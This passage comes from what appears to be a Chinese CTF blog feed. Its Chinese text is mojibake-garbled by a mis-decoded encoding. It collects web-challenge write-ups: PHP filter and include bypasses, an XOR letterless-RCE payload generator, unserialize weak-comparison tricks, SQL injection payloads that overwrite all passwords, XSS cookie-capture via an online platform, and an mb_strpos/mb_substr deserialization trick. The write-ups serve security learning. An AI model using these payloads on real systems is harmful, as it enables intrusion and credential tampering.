(ç¼–ç )();</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/QQ%E5%9B%BE%E7%89%8720240807145304.png" alt=""></p><h2 id="ä½¿ç”¨includeå‡½æ•°åŒ…å«ç»•è¿‡ï¼š">ä½¿ç”¨includeå‡½æ•°åŒ…å«ç»•è¿‡ï¼š</h2><p>?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p><h2 id="åµŒå¥—ç»•è¿‡ï¼š">åµŒå¥—ç»•è¿‡ï¼š</h2><p>?c=eval($_GET[1]);$1=phpinfo();</p><p>è‹¥èƒ½æ‰§è¡Œï¼Œå˜é‡$1å°±ä¸å†å—è¿‡æ»¤é™åˆ¶</p><h2 id="ç§¯ç´¯ï¼š">ç§¯ç´¯ï¼š</h2><ol><li><p>è¿‡æ»¤/ï¼Œå¦‚ ls /ç”¨ä¸äº†ï¼Œå¯ä»¥ä½¿ç”¨ls -alï¼Œç„¶åå‘½ä»¤è”åˆæ‰§è¡Œ</p></li><li><p>%0aæ˜¯å›è½¦ç¬¦çš„urlç¼–ç ï¼Œæœ‰æ—¶å€™è¿‡æ»¤äº†;&amp;|å¯ä»¥ä½¿ç”¨ï¼Œä½†æ˜¯æ³¨æ„ï¼Œæœ€å¥½åœ¨æµè§ˆå™¨urlæ ç›´æ¥ä½¿ç”¨ï¼Œæˆ–è€…ä½¿ç”¨hackbarï¼Œåœ¨é¢˜ç›®çš„è¾“å…¥æ¡†ä½¿ç”¨å¯èƒ½æ²¡æœ‰æ•ˆæœã€‚</p></li></ol>]]></content>
    
    
    <summary type="html">ğŸ¥§å‘½ä»¤æ‰§è¡Œè¿‡æ»¤å…³é”®å­—</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="webå§¿åŠ¿" scheme="https://m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>HUBUCTF-2022-æ–°ç”Ÿèµ›-wp</title>
    <link href="https://m3x1.cn/posts/1f67230d.html"/>
    <id>https://m3x1.cn/posts/1f67230d.html</id>
    <published>2024-11-28T16:00:00.000Z</published>
    <updated>2024-12-02T09:07:35.333Z</updated>
    
    <content type="html"><![CDATA[<h2 id="checkin">checkin</h2><blockquote><p>è€ƒç‚¹ï¼šååºåˆ—åŒ–ï¼Œå¼±æ¯”è¾ƒï¼Œphp</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$username  = &quot;this_is_secret&quot;; </span><br><span class="line">$password  = &quot;this_is_not_known_to_you&quot;; </span><br><span class="line">include(&quot;flag.php&quot;);//here I changed those two </span><br><span class="line">$info = isset($_GET[&#x27;info&#x27;])? $_GET[&#x27;info&#x27;]: &quot;&quot; ;</span><br><span class="line">$data_unserialize = unserialize($info);</span><br><span class="line">if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;username or password error!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡ï¼Œåªéœ€è¦ä¼ å…¥çš„infoçš„usernameå’Œpasswordå€¼ä¸å˜é‡çš„å€¼å¼±æ¯”è¾ƒã€‚</p><p>è¿™é‡Œå¾ˆå®¹æ˜“æƒ³åˆ°ç›¸ç­‰ï¼ˆå¼ºæ¯”è¾ƒï¼‰ï¼Œä½†æ˜¯å…¶å®æ˜¯å¼±æ¯”è¾ƒï¼Œè€Œä¸”æ ¹æ®æç¤ºå¯ä»¥çŸ¥é“è¿™ä¸¤ä¸ªå˜é‡çš„å€¼ä¼šæ”¹å˜ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸çŸ¥é“ç¡®åˆ‡çš„å€¼ï¼Œç›´æ¥æ„é€ èµ‹å€¼0å’Œ1ï¼Œæœ€åå‘ç°0å’Œ0æˆåŠŸäº†ï¼Œæ‰€ä»¥è¿™ä¸¤ä¸ªå˜é‡æ”¹å˜äº†åè¿˜æ˜¯å­—ç¬¦ä¸²</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129191723974.png" alt="image-20241129191723974"></p><blockquote><p>NSSCTF{29cf034a-9052-4aec-b776-b1c8b18b82f5}</p></blockquote><h2 id="HowToGetShell">HowToGetShell</h2><blockquote><p>è€ƒç‚¹ï¼šæ— å­—æ¯rceï¼Œphp</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$mess=$_POST[&#x27;mess&#x27;];</span><br><span class="line">if(preg_match(&quot;/[a-zA-Z]/&quot;,$mess))&#123;</span><br><span class="line">    die(&quot;invalid input!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">eval($mess);</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†æ‰€æœ‰å­—æ¯ï¼Œä½†æœ‰å­—æ¯ï¼Œå¯ä»¥ä½¿ç”¨å¼‚æˆ–ç»•è¿‡ã€‚è„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">valid = &quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot; #å¯ä»¥ç”¨çš„ç¬¦å·</span><br><span class="line">answer = &quot;phpinfo&quot;  #è¦æ„é€ çš„å‘½ä»¤</span><br><span class="line">tmp1,tmp2 = &#x27;&#x27;,&#x27;&#x27;</span><br><span class="line">for c in answer:</span><br><span class="line">    for i in valid:</span><br><span class="line">        for j in valid:</span><br><span class="line">            if (ord(i)^ord(j) == ord(c)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line">        break</span><br><span class="line">print(tmp1,tmp2)</span><br><span class="line">//0302181 @[@[_^^ ï¼Œæ‰€ä»¥ä¼ å…¥&quot;0302181&quot;^&quot;@[@[_^^&quot;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mess=$_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_();</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129203748374.png" alt="image-20241129203748374"></p><blockquote><p>NSSCTF{3290ae33-f255-4d6b-9bba-2b1be6ddd485}</p></blockquote><h2 id="Calculate">Calculate</h2><blockquote><p>è€ƒç‚¹ï¼špython,web,è„šæœ¬ç¼–å†™</p></blockquote><p>ç›´æ¥ä¸Šè„šæœ¬å§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># å‡è®¾è¿™æ˜¯æˆ‘ä»¬è¦ä¸ä¹‹äº¤äº’çš„ç½‘ç«™çš„URL</span><br><span class="line">url = &#x27;http://node5.anna.nssctf.cn:28984/&#x27;  # è¯·æ›¿æ¢ä¸ºå®é™…çš„URL</span><br><span class="line"></span><br><span class="line"># åˆ›å»ºä¸€ä¸ªä¼šè¯æ¥ä¿æŒcookieå’Œå…¶ä»–ä¼šè¯ä¿¡æ¯</span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"># æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æ¥åŒ¹é…æ•°å­—æˆ–è¿ç®—ç¬¦ï¼Œå®ƒä»¬è¢«&lt;div&gt;æ ‡ç­¾åŒ…å›´</span><br><span class="line">pattern = re.compile(r&#x27;&lt;div[^&gt;]*?&gt;([0-9+\-*\/=]+)&lt;/div&gt;&#x27;)</span><br><span class="line"></span><br><span class="line"># å¾ªç¯ç›´åˆ°æˆ‘ä»¬æ‰¾åˆ°åŒ…å«å…³é”®è¯&quot;ctf&quot;çš„é¡µé¢</span><br><span class="line">for i in range(20):</span><br><span class="line">    # å‘é€GETè¯·æ±‚æ¥è·å–å½“å‰é¡µé¢</span><br><span class="line">    response = session.get(url)</span><br><span class="line">    html_content = response.text</span><br><span class="line">    </span><br><span class="line">    # ä½¿ç”¨BeautifulSoupè§£æHTMLå†…å®¹</span><br><span class="line">    soup = BeautifulSoup(html_content, &#x27;html.parser&#x27;)</span><br><span class="line">    </span><br><span class="line">    # æŸ¥æ‰¾æ‰€æœ‰åŒ…å«æ•°å­—æˆ–è¿ç®—ç¬¦çš„&lt;div&gt;æ ‡ç­¾</span><br><span class="line">    divs = soup.find_all(&#x27;div&#x27;, text=re.compile(r&#x27;[0-9+\-*\/=]&#x27;))</span><br><span class="line">    </span><br><span class="line">    # ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ä»æ ‡ç­¾ä¸­æå–æ•°å­—æˆ–è¿ç®—ç¬¦</span><br><span class="line">    tokens = pattern.findall(str(divs))</span><br><span class="line">    </span><br><span class="line">    # æ‹¼æ¥æˆä¸€ä¸ªæ•°å­¦è¡¨è¾¾å¼ï¼ˆæ³¨æ„ï¼šè¿™é‡Œå‡è®¾è¡¨è¾¾å¼æ˜¯ç®€å•çš„ï¼Œæ²¡æœ‰æ‹¬å·ï¼‰</span><br><span class="line">    # æˆ‘ä»¬éœ€è¦å»é™¤ä»»ä½•å¤šä½™çš„ç©ºæ ¼å’Œå¯èƒ½çš„=ç¬¦å·ï¼ˆå®ƒå¯èƒ½æ˜¯è¡¨è¾¾å¼çš„ä¸€éƒ¨åˆ†æˆ–ç”¨äºæç¤ºç”¨æˆ·è¾“å…¥ï¼‰</span><br><span class="line">    # å¹¶ä¸”æˆ‘ä»¬å‡è®¾=ç¬¦å·åé¢ä¸ä¼šç´§è·Ÿæ•°å­—æˆ–è¿ç®—ç¬¦ï¼ˆå³å®ƒæ˜¯è¡¨è¾¾å¼çš„ç»“å°¾ï¼‰</span><br><span class="line">    expression_parts = [token for token in tokens if token != &#x27;=&#x27;]</span><br><span class="line">    expression = &#x27;&#x27;.join(expression_parts).replace(&#x27; &#x27;, &#x27;&#x27;)</span><br><span class="line">    print(expression)</span><br><span class="line">    # è®¡ç®—è¡¨è¾¾å¼çš„å€¼ï¼ˆæ³¨æ„ï¼šè¿™é‡Œä½¿ç”¨evalæœ‰å®‰å…¨é£é™©ï¼Œä½†åœ¨æœ¬ä¾‹ä¸­ä¸ºäº†ç®€åŒ–è€Œä½¿ç”¨ï¼‰</span><br><span class="line">    try:</span><br><span class="line">        result = eval(expression)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Error evaluating expression &#x27;&#123;expression&#125;&#x27;: &#123;e&#125;&quot;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">    # ä¸ºäº†é¿å…è¿‡å¿«åœ°å‘é€è¯·æ±‚ï¼Œæˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªçŸ­æš‚çš„å»¶è¿Ÿï¼ˆè‡³å°‘1ç§’ï¼‰</span><br><span class="line">    # æ ¹æ®é¢˜ç›®è¦æ±‚ï¼Œæˆ‘ä»¬ä¸èƒ½åœ¨1ç§’å†…å›ç­”ä¸€ä¸ªé—®é¢˜ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨0.5ç§’çš„å»¶è¿Ÿ</span><br><span class="line">    time.sleep(1.1)</span><br><span class="line">    # å‡†å¤‡POSTæ•°æ®</span><br><span class="line">    post_data = &#123;&#x27;ans&#x27;: result&#125;</span><br><span class="line">    print(result)</span><br><span class="line">    # å‘é€POSTè¯·æ±‚å°†ç­”æ¡ˆå‘é€å›æœåŠ¡å™¨</span><br><span class="line">    post_response = session.post(url, data=post_data)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    # æ£€æŸ¥å“åº”å†…å®¹æ˜¯å¦åŒ…å«å…³é”®è¯&quot;ctf&quot;</span><br><span class="line">print(post_response.text)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"># å…³é—­ä¼šè¯</span><br><span class="line">session.close()</span><br></pre></td></tr></table></figure><blockquote><p>NSSCTF{32a5eadd-b078-4e0c-9570-1b2852476085}</p></blockquote><h2 id="ezsql">ezsql</h2><blockquote><p>è€ƒç‚¹ï¼šsqlæ³¨å…¥</p></blockquote><p>å…ˆæ‰«ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°æºç ï¼Œå®¡è®¡æºç ï¼Œå‘ç°sqlæ³¨å…¥</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231234785.png" alt="image-20241129231234785"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231223286.png" alt="image-20241129231223286"></p><p>æ ¹æ®æç¤ºï¼Œå­˜åœ¨sqlæ³¨å…¥ï¼Œç›´æ¥sqlmapæ‰«</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129230333540.png" alt="image-20241129230333540"></p><p>å‘ç°åœ¨å¹´é¾„å¤„å­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼Œä¸”æ ¹æ®payloadå¯ä»¥çœ‹å‡ºæ˜¯æ•°å­—å‹æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ä¿®æ”¹å½“å‰è¡¨æ‰€æœ‰nicknameä¸º444</span><br><span class="line">nickname=aa&amp;age=11,nickname=444%23&amp;description=111&amp;token=</span><br><span class="line">ä¿®æ”¹å½“å‰è¡¨æ‰€æœ‰passwordä¸º123</span><br><span class="line">nickname=aa&amp;age=11,password=0x3230326362393632616335393037356239363462303731353264323334623730%23&amp;description=111&amp;token=</span><br><span class="line">#0x3230326362393632616335393037356239363462303731353264323334623730=hex(md5(â€˜123â€™))</span><br><span class="line">#urlencode(#)=%23</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231014113.png" alt="image-20241129231014113"></p><blockquote><p>NSSCTF{3a6a5fad-87c3-4a7a-a6b6-35f1a532b42e}</p></blockquote>]]></content>
    
    
    <summary type="html">ğŸ¥§HUBUCTF-2022-æ–°ç”Ÿèµ›-wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="æ¯”èµ›wp" scheme="https://m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>XSSåœ¨çº¿å¹³å°ä½¿ç”¨</title>
    <link href="https://m3x1.cn/posts/169f5f8e.html"/>
    <id>https://m3x1.cn/posts/169f5f8e.html</id>
    <published>2024-11-27T16:00:00.000Z</published>
    <updated>2024-12-02T09:25:18.658Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å‰è¨€ï¼šç”±äºè‡ªå·±æ­å»ºçš„xsså¹³å°éœ€è¦æœåŠ¡å™¨æ‰èƒ½è·å–å…¶ä»–ç½‘ç»œçš„cookieï¼Œæ‰€ä»¥æ— æ³•æ¥æ”¶èµ›é¢˜çš„cookieï¼Œæœ€ç®€ä¾¿çš„æ–¹æ³•è¿˜æ˜¯ä½¿ç”¨åœ¨çº¿å¹³å°ï¼Œè™½ç„¶å¯èƒ½æœ‰ä¸€å®šé£é™©ï¼Œä»¥åä¹°æœåŠ¡å™¨äº†å†æ­å»ºè‡ªå·±çš„å§</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191835876.png" alt="image-20241128191835876"></p><p>ç™»å½•åï¼Œç›´æ¥åˆ›å»ºé¡¹ç›®å°±è¡Œ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191919585.png" alt="image-20241128191919585"></p><p>ä¼ å…¥çš„åœ°å€å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>ç„¶åå°±èƒ½åœ¨å¹³å°ä¸Šæ¥å—åˆ°äº†</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128192046521.png" alt="image-20241128192046521"></p>]]></content>
    
    
    <summary type="html">XSSåœ¨çº¿å¹³å°ä½¿ç”¨</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="å…¶ä»–å§¿åŠ¿" scheme="https://m3x1.cn/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>mb_strposä¸mb_substré”™ä½ç´¢å¼•</title>
    <link href="https://m3x1.cn/posts/c81521cb.html"/>
    <id>https://m3x1.cn/posts/c81521cb.html</id>
    <published>2024-11-25T16:00:00.000Z</published>
    <updated>2024-12-02T09:01:07.291Z</updated>
    
    <content type="html"><![CDATA[<h2 id="mb-strposä¸mb-substré”™ä½ç´¢å¼•">mb_strposä¸mb_substré”™ä½ç´¢å¼•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">2. mb_substrå’Œmb_strposå‡½æ•°æ¼æ´</span><br><span class="line">mb_strpos() å’Œ mb_substr() æ˜¯ PHP ä¸­ç”¨äºå¤„ç†å¤šå­—èŠ‚å­—ç¬¦çš„å‡½æ•°ï¼Œä¸“é—¨ç”¨äºå¤„ç† UTF-8 æˆ–å…¶ä»–å¤šå­—èŠ‚ç¼–ç çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">(1)mb_strpos: ç”¨äºæŸ¥æ‰¾ä¸€ä¸ªå­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆç´¢å¼•ï¼‰ï¼Œè¿”å›ç»“æœæ˜¯è¯¥å­å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆç´¢å¼•ï¼‰ã€‚</span><br><span class="line">mb_strpos(string $haystack, string $needle, int $offset = 0, string $encoding = null): int|false</span><br><span class="line">    $haystackï¼šè¦åœ¨å…¶ä¸­æœç´¢å­å­—ç¬¦ä¸²çš„æºå­—ç¬¦ä¸²ã€‚</span><br><span class="line">    $needleï¼šè¦æœç´¢çš„å­å­—ç¬¦ä¸²ã€‚</span><br><span class="line">    $offsetï¼ˆå¯é€‰ï¼‰ï¼šä»å“ªä¸ªä½ç½®å¼€å§‹æœç´¢ï¼Œé»˜è®¤ä¸º 0ã€‚</span><br><span class="line">    $encodingï¼ˆå¯é€‰ï¼‰ï¼šè¦ä½¿ç”¨çš„å­—ç¬¦ç¼–ç ï¼Œé»˜è®¤ä¸ºå†…éƒ¨å­—ç¬¦ç¼–ç ã€‚</span><br><span class="line"></span><br><span class="line">(2)mb_substr: ç”¨äºè·å–ä¸€ä¸ªå­—ç¬¦ä¸²çš„å­ä¸²ï¼Œè¿”å›ç»“æœæ˜¯æŒ‡å®šä½ç½®å’Œé•¿åº¦çš„å­å­—ç¬¦ä¸²ã€‚</span><br><span class="line">mb_substr(string $string, int $start, int $length = null, string $encoding = null): string|false</span><br><span class="line">    $stringï¼šè¦æˆªå–çš„åŸå§‹å­—ç¬¦ä¸²ã€‚</span><br><span class="line">    $startï¼šæˆªå–çš„èµ·å§‹ä½ç½®ã€‚å¦‚æœæ˜¯è´Ÿæ•°ï¼Œåˆ™è¡¨ç¤ºä»æœ«å°¾å¼€å§‹è®¡æ•°ã€‚</span><br><span class="line">    $lengthï¼ˆå¯é€‰ï¼‰ï¼šè¦æˆªå–çš„é•¿åº¦ã€‚å¦‚æœæœªæŒ‡å®šï¼Œåˆ™é»˜è®¤æˆªå–è‡³å­—ç¬¦ä¸²çš„æœ«å°¾ã€‚</span><br><span class="line">    $encodingï¼ˆå¯é€‰ï¼‰ï¼šè¦ä½¿ç”¨çš„å­—ç¬¦ç¼–ç ï¼Œé»˜è®¤ä¸ºå†…éƒ¨å­—ç¬¦ç¼–ç ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">å½“ä»¥ \xF0 å¼€å¤´çš„å­—èŠ‚åºåˆ—å‡ºç°åœ¨ UTF-8 ç¼–ç ä¸­æ—¶ï¼Œé€šå¸¸è¡¨ç¤ºä¸€ä¸ªå››å­—èŠ‚çš„ Unicode å­—ç¬¦ã€‚è¿™æ˜¯å› ä¸º UTF-8 ç¼–ç è§„èŒƒå®šä¹‰äº†ä»¥ \xF0 å¼€å¤´çš„å­—èŠ‚åºåˆ—ç”¨äºç¼–ç è¾ƒå¤§çš„ Unicode å­—ç¬¦ã€‚</span><br><span class="line">ä¸ç¬¦åˆ4ä½çš„è§„åˆ™çš„è¯ï¼Œmb_substrå’Œmb_strposæ‰§è¡Œå­˜åœ¨å·®å¼‚ï¼š</span><br><span class="line">(1)mb_strposé‡åˆ°\xF0æ—¶ï¼Œä¼šæŠŠæ— æ•ˆå­—èŠ‚å…ˆå‰çš„å­—èŠ‚è§†ä¸ºä¸€ä¸ªå­—ç¬¦ï¼Œç„¶åä»æ— æ•ˆå­—èŠ‚é‡æ–°å¼€å§‹è§£æ</span><br><span class="line">mb_strpos(&quot;\xf0\x9fAAA&lt;BB&quot;, &#x27;&lt;&#x27;); #è¿”å›4 \xf0\x9fè§†ä½œæ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œä»Aå¼€å§‹å˜ä¸ºæ— æ•ˆå­—èŠ‚ #Aä¸º\x41  ä¸Šè¿°å­—ç¬¦ä¸²å…¶è®¤ä¸ºæ˜¯7ä¸ªå­—èŠ‚</span><br><span class="line"></span><br><span class="line">(2)mb_substré‡åˆ°\xF0æ—¶ï¼Œä¼šæŠŠæ— æ•ˆå­—èŠ‚å½“åšå››å­—èŠ‚Unicodeå­—ç¬¦çš„ä¸€éƒ¨åˆ†ï¼Œç„¶åç»§ç»­è§£æ</span><br><span class="line">mb_substr(&quot;\xf0\x9fAAA&lt;BB&quot;, 0, 4); #&quot;\xf0\x9fAAA&lt;B&quot; \xf0\x9fAAè§†ä½œä¸€ä¸ªå­—ç¬¦ ä¸Šè¿°å­—ç¬¦ä¸²å…¶è®¤ä¸ºæ˜¯5ä¸ªå­—èŠ‚</span><br><span class="line"></span><br><span class="line">ç»“è®ºï¼šmb_strposç›¸å¯¹äºmb_substræ¥è¯´ï¼Œå¯ä»¥æŠŠç´¢å¼•å€¼å‘åç§»åŠ¨</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">3. mb_substrå’Œmb_strposå‡½æ•°æ¼æ´ä¸æœ¬é¢˜ç»“åˆ</span><br><span class="line">é€šè¿‡æ§åˆ¶Cçš„é•¿åº¦å¯ä»¥æ§åˆ¶æˆ‘ä»¬æƒ³è¦æ‰§è¡Œ$keyçš„é•¿åº¦</span><br><span class="line">é€šè¿‡æ§åˆ¶Bæˆ‘ä»¬å¯ä»¥æ§åˆ¶ç´¢å¼•å€¼éœ€è¦æå‰å‡ ä½</span><br><span class="line">æ¯å‘é€ä¸€ä¸ª%f0abcï¼Œmb_strposè®¤ä¸ºæ˜¯4ä¸ªå­—èŠ‚ï¼Œmb_substrè®¤ä¸ºæ˜¯1ä¸ªå­—èŠ‚ï¼Œç›¸å·®3ä¸ªå­—èŠ‚</span><br><span class="line">æ¯å‘é€ä¸€ä¸ª%f0%9fab,mb_strposè®¤ä¸ºæ˜¯3ä¸ªå­—èŠ‚ï¼Œmb_substrè®¤ä¸ºæ˜¯1ä¸ªå­—èŠ‚ï¼Œç›¸å·®2ä¸ªå­—èŠ‚</span><br><span class="line">æ¯å‘é€ä¸€ä¸ª%f0%9f%9fa,mb_strposè®¤ä¸ºæ˜¯2ä¸ªå­—èŠ‚ï¼Œmb_substrè®¤ä¸ºæ˜¯1ä¸ªå­—èŠ‚ï¼Œç›¸å·®1ä¸ªå­—èŠ‚</span><br></pre></td></tr></table></figure><p>ä¾‹å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function substrstr($data)</span><br><span class="line">&#123;</span><br><span class="line">    $start = mb_strpos($data, &quot;[&quot;);</span><br><span class="line">    $end = mb_strpos($data, &quot;]&quot;);</span><br><span class="line">    return mb_substr($data, $start + 1, $end - 1 - $start);</span><br><span class="line">&#125;</span><br><span class="line">class read_file&#123;</span><br><span class="line">    public $start;</span><br><span class="line">    public $filename=&quot;/etc/passwd&quot;;</span><br><span class="line">    public function __construct($start)&#123;</span><br><span class="line">        $this-&gt;start=$start;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;start == &quot;gxngxngxn&quot;)&#123;</span><br><span class="line">           echo &#x27;What you are reading is:&#x27;.file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;start&#x27;]))&#123;</span><br><span class="line">    $readfile = new read_file($_GET[&#x27;start&#x27;]);</span><br><span class="line">    $read=isset($_GET[&#x27;read&#x27;])?$_GET[&#x27;read&#x27;]:&quot;I_want_to_Read_flag&quot;;</span><br><span class="line">    if(preg_match(&quot;/\[|\]/i&quot;, $_GET[&#x27;read&#x27;]))&#123;</span><br><span class="line">        die(&quot;NONONO!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $ctf = substrstr($read.&quot;[&quot;.serialize($readfile).&quot;]&quot;);</span><br><span class="line">    